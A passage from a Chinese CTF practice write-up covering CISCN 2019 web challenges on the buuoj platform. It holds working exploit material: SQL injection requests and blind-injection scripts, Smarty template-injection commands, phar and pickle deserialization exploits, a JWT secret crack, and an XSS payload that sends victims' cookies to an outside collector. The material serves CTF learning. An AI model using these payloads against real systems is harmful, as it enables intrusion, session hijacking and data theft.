http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nConnection: close\nReferer: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/\nUpgrade-Insecure-Requests: 1\n\nuser_name=1&phone=1&address=1'  where user_id=(updatexml(0,concat(0,(select reverse(load_file('/flag.txt')))),0))#\n```\n\n```http\nPOST /change.php HTTP/1.1\nHost: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 29\nOrigin: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nConnection: close\nReferer: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/\nUpgrade-Insecure-Requests: 1\n\nuser_name=1&phone=1&address=1\n```\n\n输出内容\n\n```\nerrorXPATH syntax error: '\n}6e91d8479aad-9758-4ae4-4fbe-71'\n```\n\n拼接即可\n\n\n\n## 华东南赛区 Web11\n\n[关于SSTI](https://zhuanlan.zhihu.com/p/28823933)\n\n打开题目，页面说提供了查询公网IP的api,右上角还有显示IP，于是在头部加入X-Forwarded-For\n\n![](/pic/94.png)\n\n可能存在SSTI，测试一下的确存在SSTI\n\n![](/pic/96.png)\n\n在网页的最下方发现了**Build With Smarty** \n\n一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。 3.1.30\n\n![](/pic/97.png)\n\nSmarty支持使用{php}{/php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但是Smarty3.0手册说已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。发现报错了\n\n![](/pic/98.png)\n\n{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。\n\n那么对于php5的环境我们就可以使用，服务器是7.0+无法使用js标签\n\n```\n<script language=\"php\">phpinfo();</script>\n```\n\n有一个[{if}标签](https://www.smarty.net/docs/zh_CN/language.function.if.tpl)可以使用\n\nmarty的`{if}`条件判断和PHP的[if](http://php.net/if) 非常相似，只是增加了一些特性。 每个`{if}`必须有一个配对的`{/if}`. 也可以使用`{else}` 和 `{elseif}`. 全部的PHP条件表达式和函数都可以在if内使用，如*||*, *or*, *&&*, *and*, *is_array()*, 等等.\n\n将X-Forwarded-For头改为{if phpinfo()}{/if}可以查看phpinfo\n\n![](/pic/99.png)\n\n{if system('cat /flag')}{/if}即可获取到flag\n\n[参考链接](https://www.jianshu.com/p/eb8d0137a7d3)\n\n\n\n## 华东北赛区 Web2\n\n使用御剑扫描发现login.php，admin.php\n\n![](/pic/100.png)\n\n访问admin.php，发现要admin才访问，去login.php注册一个账号，然后登入，有一个投稿\n\n![](/pic/101.png)\n\n明显的提示这题是XSS\n\n提交数据之后，“=” 被替换成了“等于号”，src,//被替换成waf，单引号、括号、双引号会被替换成中文的。\n\n来自赵师傅的payload     svg标签 ：xml自动解析html实体编码\n\n```php\nin_str = \"(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&id=dzWPkK&keepsession=0&location='+escape((function(){try{return document.location.href}catch(e){return''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())+'&opener='+escape((function(){try{return(window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})());})();\"\noutput = \"\"\nfor c in in_str:\n    output += \"&#\" + str(ord(c))\nprint(\"<svg><script>eval&#40&#34\" + output + \"&#34&#41</script>\")\n```\n\n得到地址后去commitbug.php（反馈）页面提交url\n\n![](/pic/102.png)\n\nurl中要将*.buuoj.cn改成web\n\n附上碰撞的脚本，发现使用python编写会出错（字符与MD5对应不上）\n\n```php\n<?php\n\nfor($a=0;substr(md5($a),0,6)!='2ccf73';$a++){}\necho md5($a);\necho urldecode('%09');\necho $a;\n //2ccf731c402b81796327fb7a4c5cd943\t225315\n?>\n```\n\n去xss平台收cookie\n\n![](/pic/103.png)\n\n修改cookie为收到的cookie，访问admin.php   存在sql注入\n\n![](/pic/104.png)![](/pic/105.png)\n\n编写注入脚本\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 2/19/2020 12:34 AM\nimport requests\n\ndef str2hex(strs):\n    hexs='0x'\n    for x in range(len(strs)):\n        hexs+=hex(ord(strs[x]))[2:]\n    print(hexs)\n    return hexs\n\ndef get(payload):\n    url = 'http://da74811e-0cb8-498a-a1c7-362929c21b2d.node3.buuoj.cn/admin.php?id=0^('+payload+')'\n    # print(url)\n    html = requests.get(url,cookies={'PHPSESSID':'e7f4c1e48fd638f2a517cbe6d0a81857'})\n    # print(html)\n    return html\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print(html,'*-*-*-*-*-*', mid)\n            if '不能查询管理员哦'  in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    print(database)\n\ndef get_tables(db):\n    db=str2hex(db)\n    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema='+db+')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    table = str2hex(table)\n    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name='+table+')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select(group_concat('+columns+'))from('+table+')'\n    password=binsea(s_payload)\n\n\n# get_database() #ciscn\n\n# get_tables('ciscn') #flag,users\n\n# get_columns('flag') #flagg\n\nget_data('flagg','flag') #flag{88331b80-7fb8-4f2f-9fa1-a4b85bd8562d}\n```\n\n\n\n## 华东南赛区 Double Secret\n\n打卡题目的提示是:`Welcome To Find Secret`\n\n使用御剑扫一下目录，扫描到robots.txt\n\n内容是: `It is Android ctf`\n\n尝试范围/secret  提示`Tell me your secret.I will encrypt it so others can't see`\n\n传入参数?secret=123456789后报错\n\n![](/pic/106.png)\n\n发现是flask框架，点开/app/app.py后有如下代码\n\n```python\nFile \"/app/app.py\", line 35, in secret\n\n    if(secret==None):\n\n        return 'Tell me your secret.I will encrypt it so others can\\'t see'\n\n    rc=rc4_Modified.RC4(\"HereIsTreasure\")   #解密\n\n    deS=rc.do_crypt(secret)\n\n\n    a=render_template_string(safe(deS))\n\n [Open an interactive python shell in this frame]  \n\n    if 'ciscn' in a.lower():\npython\n        return 'flag detected!'\n\n    return a\n```\n\n是RC4加密，RC4算法加密又是解密将payload加密就好\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 2/25/2020 11:38 PM\nimport urllib\nimport requests\n\n\nclass RC4:\n    def __init__(self, key):\n        self.key = key\n        self.key_length = len(key)\n        self._init_S_box()\n\n    def _init_S_box(self):\n        self.Box = [i for i in range(256)]\n        k = [self.key[i % self.key_length] for i in range(256)]\n        j = 0\n        for i in range(256):\n            j = (j + self.Box[i] + ord(k[i])) % 256\n            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]\n\n    def crypt(self, plaintext):\n        i = 0\n        j = 0\n        result = ''\n        for ch in plaintext:\n            i = (i + 1) % 256\n            j = (j + self.Box[i]) % 256\n            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]\n            t = (self.Box[i] + self.Box[j]) % 256\n            result += chr(self.Box[t] ^ ord(ch))\n        return result\n\n\nurl = \"http://69f0dda2-d8d5-458e-97f9-342bff8d47a4.node3.buuoj.cn/secret?secret=\"\na = RC4('HereIsTreasure')\ncmd = \"{{ [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() }}\"\npayload = urllib.parse.quote(a.crypt(cmd))\nprint(payload)\nres = requests.get(url + payload)\nprint(res.text)\n```\n\n","source":"_posts/buuoj刷题记录12-CISCN2019.md","raw":"---\ntitle: buuoj刷题记录12-CISCN2019\ndate: 2020-02-10 00:04:17\ntags:\n - web\n - ciscn2019\ncategories: \n - 刷题记录\n---\n\n## 华北赛区 Day1 Web1 Dropbox\n\n拿到题目是一个登入页面\n\n注册，登入，上传文件\n\n上传一个图片，上传成功。点击下载，下载时发现有任意文件下载漏洞\n\n把文件下载下来进行代码审计\n\n<!--more-->\n\n```php+HTML\n//index.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n?>\n\n\n<!DOCTYPE html>\n<html>\n\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n<title>网盘管理</title>\n\n<head>\n    <link href=\"static/css/bootstrap.min.css\" rel=\"stylesheet\">\n    <link href=\"static/css/panel.css\" rel=\"stylesheet\">\n    <script src=\"static/js/jquery.min.js\"></script>\n    <script src=\"static/js/bootstrap.bundle.min.js\"></script>\n    <script src=\"static/js/toast.js\"></script>\n    <script src=\"static/js/panel.js\"></script>\n</head>\n\n<body>\n    <nav aria-label=\"breadcrumb\">\n    <ol class=\"breadcrumb\">\n        <li class=\"breadcrumb-item active\">管理面板</li>\n        <li class=\"breadcrumb-item active\"><label for=\"fileInput\" class=\"fileLabel\">上传文件</label></li>\n        <li class=\"active ml-auto\"><a href=\"#\">你好 <?php echo $_SESSION['username']?></a></li>\n    </ol>\n</nav>\n<input type=\"file\" id=\"fileInput\" class=\"hidden\">\n<div class=\"top\" id=\"toast-container\"></div>\n\n<?php\ninclude \"class.php\";\n\n$a = new FileList($_SESSION['sandbox']);\n$a->Name();\n$a->Size();\n?>\n```\n\n```php+HTML\n//download.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\nini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename) && stristr($filename, \"flag\") === false) {   //stristr 搜索字符串在另一字符串中的第一次出现不区分大小写\n    Header(\"Content-type: application/octet-stream\");\n    Header(\"Content-Disposition: attachment; filename=\" . basename($filename));\n    echo $file->close();\n} else {\n    echo \"File not exist\";\n}\n?>\n\n```\n\n```php+HTML\n//delete.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename)) {\n    $file->detele();\n    Header(\"Content-type: application/json\");\n    $response = array(\"success\" => true, \"error\" => \"\");\n    echo json_encode($response);\n} else {\n    Header(\"Content-type: application/json\");\n    $response = array(\"success\" => false, \"error\" => \"File not exist\");\n    echo json_encode($response);\n}\n?>\n```\n\n```php+HTML\n//register.php\n<?php\nsession_start();\nif (isset($_SESSION['login'])) {\n    header(\"Location: index.php\");\n    die();\n}\n?>\n\n<!doctype html>\n\n<head>\n  <meta charset=\"utf-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n  <meta name=\"description\" content=\"\">\n  <title>注册</title>\n\n  <!-- Bootstrap core CSS -->\n  <link href=\"static/css/bootstrap.min.css\" rel=\"stylesheet\">\n\n\n  <style>\n    .bd-placeholder-img {\n      font-size: 1.125rem;\n      text-anchor: middle;\n    }\n\n    @media (min-width: 768px) {\n      .bd-placeholder-img-lg {\n        font-size: 3.5rem;\n      }\n    }\n  </style>\n  <!-- Custom styles for this template -->\n  <link href=\"static/css/std.css\" rel=\"stylesheet\">\n</head>\n\n<body class=\"text-center\">\n  <form class=\"form-signin\" action=\"register.php\" method=\"POST\">\n    <h1 class=\"h3 mb-3 font-weight-normal\">注册</h1>\n    <label for=\"username\" class=\"sr-only\">Username</label>\n    <input type=\"text\" name=\"username\" class=\"form-control\" placeholder=\"Username\" required autofocus>\n    <label for=\"password\" class=\"sr-only\">Password</label>\n    <input type=\"password\" name=\"password\" class=\"form-control\" placeholder=\"Password\" required>\n    <button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">提交</button>\n    <p class=\"mt-5 mb-3 text-muted\">&copy; 2018-2019</p>\n  </form>\n</body>\n<div class=\"top\" id=\"toast-container\"></div>\n\n<script src=\"static/js/jquery.min.js\"></script>\n<script src=\"static/js/bootstrap.bundle.min.js\"></script>\n<script src=\"static/js/toast.js\"></script>\n</html>\n\n\n<?php\ninclude \"class.php\";\n\nif (isset($_POST[\"username\"]) && isset($_POST[\"password\"])) {\n    $u = new User();\n    $username = (string) $_POST[\"username\"];\n    $password = (string) $_POST[\"password\"];\n    if (strlen($username) < 20 && strlen($username) > 2 && strlen($password) > 1) {\n        if ($u->add_user($username, $password)) {\n            echo(\"<script>window.location.href='login.php?register';</script>\");\n            die();\n        } else {\n            echo \"<script>toast('此用户名已被使用', 'warning');</script>\";\n            die();\n        }\n    }\n    echo \"<script>toast('请输入有效用户名和密码', 'warning');</script>\";\n}\n?>\n```\n\n```php+HTML\n//class.php\n<?php\nerror_reporting(0);\n$dbaddr = \"127.0.0.1\";\n$dbuser = \"root\";\n$dbpass = \"root\";\n$dbname = \"dropbox\";\n$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);\n\nclass User {\n    public $db;\n\n    public function __construct() {\n        global $db;\n        $this->db = $db;\n    }\n\n    public function user_exist($username) {\n        $stmt = $this->db->prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->store_result();\n        $count = $stmt->num_rows;\n        if ($count === 0) {\n            return false;\n        }\n        return true;\n    }\n\n    public function add_user($username, $password) {\n        if ($this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\");\n        $stmt->bind_param(\"ss\", $username, $password);\n        $stmt->execute();\n        return true;\n    }\n\n    public function verify_user($username, $password) {\n        if (!$this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->bind_result($expect);\n        $stmt->fetch();\n        if (isset($expect) && $expect === $password) {\n            return true;\n        }\n        return false;\n    }\n\n    public function __destruct() {\n        $this->db->close();\n    }\n}\n\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __construct($path) {\n        $this->files = array();\n        $this->results = array();\n        $this->funcs = array();\n        $filenames = scandir($path);\n\n        $key = array_search(\".\", $filenames);\n        unset($filenames[$key]);   //销毁变量\n        $key = array_search(\"..\", $filenames);\n        unset($filenames[$key]);\n\n        foreach ($filenames as $filename) {\n            $file = new File();\n            $file->open($path . $filename);\n            array_push($this->files, $file);\n            $this->results[$file->name()] = array();\n        }\n    }\n\n    public function __call($func, $args) {  //调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的\n        array_push($this->funcs, $func);   \n        foreach ($this->files as $file) {\n            $this->results[$file->name()][$func] = $file->$func();\n        }\n    }\n\n    public function __destruct() {\n        $table = '<div id=\"container\" class=\"container\"><div class=\"table-responsive\"><table id=\"table\" class=\"table table-bordered table-hover sm-font\">';\n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';    //将$value转换为 HTML 实体\n            }\n            $table .= '<td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"><a href=\"#\" class=\"download\">下载</a> / <a href=\"#\" class=\"delete\">删除</a></td>';\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n\nclass File {\n    public $filename;\n\n    public function open($filename) {\n        $this->filename = $filename;\n        if (file_exists($filename) && !is_dir($filename)) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public function name() {\n        return basename($this->filename);  //返回路径中的文件名部分\n    }\n\n    public function size() {\n        $size = filesize($this->filename);\n        $units = array(' B', ' KB', ' MB', ' GB', ' TB');\n        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;\n        return round($size, 2).$units[$i];\n    }\n\n    public function detele() {\n        unlink($this->filename);  //删除文件\n    }\n\n    public function close() {\n        return file_get_contents($this->filename);\n    }\n}\n?>\n```\n\n```php+HTML\n//login.php\n<?php\nsession_start();\nif (isset($_SESSION['login'])) {\n    header(\"Location: index.php\");\n    die();\n}\n?>\n\n<!doctype html>\n\n<head>\n  <meta charset=\"utf-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n  <meta name=\"description\" content=\"\">\n  <title>登录</title>\n\n  <!-- Bootstrap core CSS -->\n  <link href=\"static/css/bootstrap.min.css\" rel=\"stylesheet\">\n\n\n  <style>\n    .bd-placeholder-img {\n      font-size: 1.125rem;\n      text-anchor: middle;\n    }\n\n    @media (min-width: 768px) {\n      .bd-placeholder-img-lg {\n        font-size: 3.5rem;\n      }\n    }\n  </style>\n  <!-- Custom styles for this template -->\n  <link href=\"static/css/std.css\" rel=\"stylesheet\">\n</head>\n\n<body class=\"text-center\">\n  <form class=\"form-signin\" action=\"login.php\" method=\"POST\">\n    <h1 class=\"h3 mb-3 font-weight-normal\">登录</h1>\n    <label for=\"username\" class=\"sr-only\">Username</label>\n    <input type=\"text\" name=\"username\" class=\"form-control\" placeholder=\"Username\" required autofocus>\n    <label for=\"password\" class=\"sr-only\">Password</label>\n    <input type=\"password\" name=\"password\" class=\"form-control\" placeholder=\"Password\" required>\n    <button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">提交</button>\n    <p class=\"mt-5 text-muted\">还没有账号? <a href=\"register.php\">注册</a></p>\n    <p class=\"text-muted\">&copy; 2018-2019</p>\n  </form>\n  <div class=\"top\" id=\"toast-container\"></div>\n</body>\n\n<script src=\"static/js/jquery.min.js\"></script>\n<script src=\"static/js/bootstrap.bundle.min.js\"></script>\n<script src=\"static/js/toast.js\"></script>\n</html>\n\n\n<?php\ninclude \"class.php\";\n\nif (isset($_GET['register'])) {\n    echo \"<script>toast('注册成功', 'info');</script>\";\n}\n\nif (isset($_POST[\"username\"]) && isset($_POST[\"password\"])) {\n    $u = new User();\n    $username = (string) $_POST[\"username\"];\n    $password = (string) $_POST[\"password\"];\n    if (strlen($username) < 20 && $u->verify_user($username, $password)) {\n        $_SESSION['login'] = true;\n        $_SESSION['username'] = htmlentities($username);\n        $sandbox = \"uploads/\" . sha1($_SESSION['username'] . \"sftUahRiTz\") . \"/\";\n        if (!is_dir($sandbox)) {\n            mkdir($sandbox);\n        }\n        $_SESSION['sandbox'] = $sandbox;\n        echo(\"<script>window.location.href='index.php';</script>\");\n        die();\n    }\n    echo \"<script>toast('账号或密码错误', 'warning');</script>\";\n}\n?>\n```\n\n\n\n在class.php中，File::close()可以读取到文件内容\n\n```php\nclass File {\n    public $filename;\n\n    ...\n\n    public function close() {\n        return file_get_contents($this->filename);\n    }\n}\n```\n\nUser类中的析构函数中有执行close()函数过程\n\n```php\nclass User {\n    public $db;\n\n    public function __construct() {\n        global $db;\n        $this->db = $db;\n    }\n    \n    ...\n    \n    public function __destruct() {\n        $this->db->close();\n    }\n}\n```\n\n而FileList类中没有close()函数，但是如果调用FileList类中的close（）,就会调用到File类中的close()。从而获取flag的内容\n\n```php\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n    \n\tpublic function __construct($path) {\n        $this->files = array();\n        $this->results = array();\n        $this->funcs = array();\n        $filenames = scandir($path);\n\n        $key = array_search(\".\", $filenames);\n        unset($filenames[$key]);   //销毁变量\n        $key = array_search(\"..\", $filenames);\n        unset($filenames[$key]);\n\n        foreach ($filenames as $filename) {\n            $file = new File();\n            $file->open($path . $filename);\n            array_push($this->files, $file);\n            $this->results[$file->name()] = array();\n        }\n   \n   \n    public function __call($func, $args) {  //调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的\n        array_push($this->funcs, $func);   \n        foreach ($this->files as $file) {\n            $this->results[$file->name()][$func] = $file->$func();\n        }\n    }\n\n    ...\n    \n}\n```\n\n[关于php反序列化]([https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96](https://www.cnblogs.com/20175211lyz/p/11403397.html#六phar反序列化))在刷题记录11当中也有两篇关于phar的文章[参考文章1](https://paper.seebug.org/680/)     [参考文章2](https://xz.aliyun.com/t/2958)\n\n重点在class.php，delete.php，和download.php中\n\n在delete.php、download.php中file_exists会触发phar反序列化漏洞，但是在download.php有设置open_basedir，而delete.php中没有，所以选择delete.php\n\n编写生成phar的脚本\n\n```php\n<?php\nclass User\n{\n    public $db;\n}\n\nclass File\n{\n    public $filename;\n}\n\nclass FileList\n{\n    private $files;\n    private $results;\n    private $funcs;\n    public function __construct()\n    {\n        $file = new File();\n        $file->filename=\"/flag.txt\";\n        $this->files=array($file);\n        // TODO: Implement __destruct() method.\n    }\n}\n\n$test = new User();\n$test->db = new FileList();\n$phar = new Phar('s.phar');\n$phar->startBuffering();\n$phar->setStub(\"GIF89a __HALT_COMPILER();\");\n$phar->setMetadata($test);\n$phar->addFromString('a','a');\n$phar->stopBuffering();\n\n```\n\n将生成的s.phar改后缀为gif，上传，在删除s.gif时，抓包修改filename为`phar://s.gif`\n\n![](/pic/74.png)\n\n\n\n## 华北赛区 Day1 Web2 ikun\n\n打开题目有注册界面，先注册，登入\n\n回到首页发现要买到LV6\n\n![](/pic/75.png)\n\n在第181页找到了LV6点击购买\n\n![](/pic/76.png)\n\n抓包发现有一个价格，有一个折扣\n\n```http\nPOST /shopcar HTTP/1.1\nHost: c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 106\nOrigin: http://c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn\nConnection: close\nReferer: http://c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn/shopcar\nCookie: _xsrf=2|578fed8a|97f2448968d2a525b9b0490c07c3413f|1581661272; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78; commodity_id=\"2|1:0|10:1581662353|12:commodity_id|8:MTYyNA==|e3649aa3872d333d61bd8b14770c0c7ca9c0539d9263777c505ebe2ac3e7e15f\"\nUpgrade-Insecure-Requests: 1\n\n_xsrf=2%7C83e3992c%7C439e302fbcbed1836ddc3daad3af3599%7C1581661272&id=1624&price=1145141919.0&discount=0.8\n```\n\n把价格改成很小发现出错，把折扣改小出现新界面提示需要admin才能访问\n\n![](/pic/77.png)\n\n![](/pic/78.png)\n\n查看cookie，其中有一个JWT、_xsrf、commodity_id\n\n[关于JWT](https://blog.csdn.net/hekewangzi/article/details/72885670)   去jwt.io解析一下\n\n![](/pic/79.png)\n\n使用的是HS256（HMAC SHA256对称加密）算法\n\n使用c-jwt-cracker破解成功，密钥为1Kun\n\n```bash\nroot@kali:~/tools/c-jwt-cracker# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78\nSecret is \"1Kun\"\n```\n\n回到https://jwt.io/#debugger修改username为admin，在下方填入密钥1Kun\n\n![](/pic/80.png)  \n\n然后修改cookie为`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo`\n\n![](/pic/81.png)  \n\n点击页面无反应，查看源码，发现了一个WWW.ZIP\n\n![](/pic/82.png)  \n\n打开发现是tornado的框架\n\n既然PHP有序列化漏洞，python也有，通过pickle模块实现 [参考文章]（https://www.jianshu.com/p/8fd3de5b4843）\n\n在sshop/view/Admin.py中含有序列化漏洞\n\n![](/pic/83.png)\n\n```python\nimport tornado.web\nfrom sshop.base import BaseHandler\nimport pickle\nimport urllib\n\n\nclass AdminHandler(BaseHandler):\n    @tornado.web.authenticated\n    def get(self, *args, **kwargs):\n        if self.current_user == \"admin\":\n            return self.render('form.html', res='This is Black Technology!', member=0)\n        else:\n            return self.render('no_ass.html')\n\n    @tornado.web.authenticated\n    def post(self, *args, **kwargs):\n        try:\n            become = self.get_argument('become')\n            p = pickle.loads(urllib.unquote(become))     \n            return self.render('form.html', res=p, member=1)\n        except:\n            return self.render('form.html', res='This is Black Technology!', member=0)\n```\n\n编写exp\n\n```python\nimport pickle\nimport urllib\n\nclass test(object):\n    def __reduce__(self):\n        return eval,(\"open('/flag.txt','r').read()\",)\nif __name__ == '__main__':\n    a = test()\n    payload = pickle.dumps(a)\n    print(urllib.quote(payload))  #c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.\n    \n```\n\n在/b1g_m4mber界面点击一键成为大会员\n\n在BP中修改post中的become数据\n\n![](/pic/84.png)\n\n\n\n\n\n## 总决赛 Day2 Web1 Easyweb\n\n打开又是一个登入界面，访问robots.txt\n\n```\nUser-agent: *\nDisallow: *.php.bak\n```\n\n在登入界面登入后有一个get /image.php?id=1请求\n\n访问/image.php.bak得到源码\n\n```php\n<﻿?php\ninclude \"config.php\";\n\n$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";\n$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";\n\n$id=addslashes($id);\n$path=addslashes($path);\n\n$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);\n$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path); \n\n$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");\n$row=mysqli_fetch_array($result,MYSQLI_ASSOC);\n\n$path=\"./\" . $row[\"path\"];\nheader(\"Content-Type: image/jpeg\");\nreadfile($path);\n```\n\naddslashes() 返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（*'*）、双引号（*\"*）、反斜线（*\\*）与 NUL（**`NULL`** 字符）。\n\n因为单引号被过滤，刚好又有两个变量，id后面的单引号被转义后，path后面输入的内容就会被当作语句执行，然后把path后面的单引号注释掉就不会报错了。\n\n```\n\"select * from images where id='\\' or path='$path'\"    ->\n\"select * from images where id=' or path=' $path \"\n```\n\n编写盲注脚本\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 2/14/2020 8:39 PM\nimport requests\n\ndef str2hex(strs):\n    hexs='0x'\n    for x in range(len(strs)):\n        hexs+=hex(ord(strs[x]))[2:]\n    print(hexs)\n    return hexs\n\ndef get(payload):\n    url = 'http://48e2e973-9423-4d4e-b6ff-0e79cf4c1a5f.node3.buuoj.cn/image.php?id=\\\\0&path=or id=('+payload+')--+'\n    # print(url)\n    html = requests.get(url)\n    # print(html)\n    return html\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"if(ascii(substr((%s),%d,1))>%d,1,0)\" % (s_payload,x, mid)\n\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print(html,'*-*-*-*-*-*', mid)\n            if 'F'  in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    print(database)\n\ndef get_tables(db):\n    db=str2hex(db)\n    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema='+db+')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    table = str2hex(table)\n    s_payload = 